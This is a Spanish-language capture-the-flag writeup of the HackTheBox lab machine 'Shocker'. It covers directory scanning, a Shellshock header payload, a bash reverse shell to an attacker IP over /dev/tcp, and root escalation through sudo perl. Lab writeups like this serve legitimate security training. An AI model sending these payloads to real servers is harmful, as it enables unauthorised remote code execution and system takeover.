---
layout: single
title: Writeup HTB - Maquina Shocker
comments: true
excerpt: "La maquina Shocker es una maquina linux - Easy, comenzamos escanendo directorios de una pagina web, encontramos el directorio cgi-bin donde logramos encontrar un script llamado user.sh, dicho script puede ser explotable a la vulnerabilidad ShellShok que nos permite ejecutar comandos como el usuario Shelly. Por ultimo logramos escalar privilegios como root abusando de los permisos de sudo con el binario perl."
date: 2022-02-05
classes: wide
header:
  teaser: /assets/images/2022-02-07-writeup-maquina-htb-shocker/Untitled.png
  teaser_home_page: true
categories:
  - HackTheBox
tags:
  - OSCP  
  - Hacking
  - xxe
  - Easy
---

# HTB - Shocker
<p align="center">
<img src="/assets/images/2022-02-07-writeup-maquina-htb-shocker/Untitled.png">
</p>

## Resumen
<div style="text-align: justify">
La maquina Shocker es una maquina linux - Easy, comenzamos escanendo directorios de una pagina web, encontramos el directorio cgi-bin donde logramos encontrar un script llamado user.sh, dicho script puede ser explotable a la vulnerabilidad ShellShok que nos permite ejecutar comandos como el usuario Shelly. Por ultimo logramos escalar privilegios como root abusando de los permisos de sudo con el binario perl.
</div>

## Scan Nmap

![Untitled](/assets/images/2022-02-07-writeup-maquina-htb-shocker/Untitled%201.png)

## Pagina Web - Port 80

lo primero que hacemos es revisar la pagina web de esta maquina, pero solo encontramos un imagen divertida con un mensaje de Don’t Bug Me!

![Untitled](/assets/images/2022-02-07-writeup-maquina-htb-shocker/Untitled%202.png)

realizamos un escaneo de directorios y solo encontramos el directorio cgi-bin, dicho directorio se utiliza para alojar programas que son utilizados para ejecutar tareas en el servidor.

```bash
Shocker # ❯ dirsearch -u http://10.129.1.175 -w /usr/share/wordlists/dirb/common.txt -f -e php,html,js,txt,save,bak -t 200
```

![Untitled](/assets/images/2022-02-07-writeup-maquina-htb-shocker/Untitled%203.png)

Por lo tanto hagamos un escaneo a dicho directorio con las siguientes extensiones

```bash
Shocker # ❯ dirsearch -u http://10.129.1.175/cgi-bin/ -w /usr/share/wordlists/dirb/common.txt -f -e sh,cgi,pl -t 200
```

![Untitled](/assets/images/2022-02-07-writeup-maquina-htb-shocker/Untitled%204.png)

probamos que arroja dicho script user.sh

```bash
Shocker # ❯ curl -s http://10.129.1.175/cgi-bin/user.sh                  
Content-Type: text/plain

Just an uptime test script

 11:42:43 up  2:25,  0 users,  load average: 0.00, 0.00, 0.00
```

### Explotacion vulnerabilidad Shellshock

Primero vamos a aclarar que el nombre oficial de esta vulnerabilidad es [GNU Bash Remote Code Execution Vulnerability](http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-6271) (CVE-2014-6271) y está considerada como **grave**, tal y como sucedió con [Heartbleed](https://www.welivesecurity.com/la-es/2014/04/09/5-cosas-debes-saber-sobre-heartbleed/), ya que permitiría la **ejecución remota de código** y así obtener el control de un ordenador.

El problema con esta vulnerabilidad se viene produciendo porque Bash permite declarar funciones (algo que tampoco es extraño y entra dentro de lo normal), pero estas **no se validan de forma correcta** cuando se almacenan en una variable. En otras palabras: Bash se pasa de la raya, extralimita sus funciones y sigue ejecutando código a pesar de haber finalizado de procesar la función.

Asi pues explotamos dicha vulnerabilidad de la siguiente manera

```bash
curl -H "user-agent: () { :; }; echo;echo; /bin/bash -c 'id'" http://10.129.1.175/cgi-bin/user.sh
```

![Untitled](/assets/images/2022-02-07-writeup-maquina-htb-shocker/Untitled%205.png)

### Reverse shell - User shelly

para obtener una reverse shell podemos un puerto 443 en escucha con netcat

![Untitled](/assets/images/2022-02-07-writeup-maquina-htb-shocker/Untitled%206.png)

ejecutamos este payload

```bash
Shocker # ❯ curl -H "user-agent: () { :; }; echo;echo; /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.5/443 0>&1'" http://10.129.1.175/cgi-bin/user.sh
```

y logramos conectarnos a una reverse shell con el usuario shelly

![Untitled](/assets/images/2022-02-07-writeup-maquina-htb-shocker/Untitled%207.png)

## Escalacion de privilegios - User root

si revisamos los permisos de sudo

```bash
shelly@Shocker:/usr/lib/cgi-bin$ sudo -l
```

![Untitled](/assets/images/2022-02-07-writeup-maquina-htb-shocker/Untitled%208.png)

logramos escalar privilegios como root de la siguiente manera

```bash
shelly@Shocker:/usr/lib/cgi-bin$ sudo /usr/bin/perl -e 'exec "/bin/sh";'
```

![Untitled](/assets/images/2022-02-07-writeup-maquina-htb-shocker/Untitled%209.png)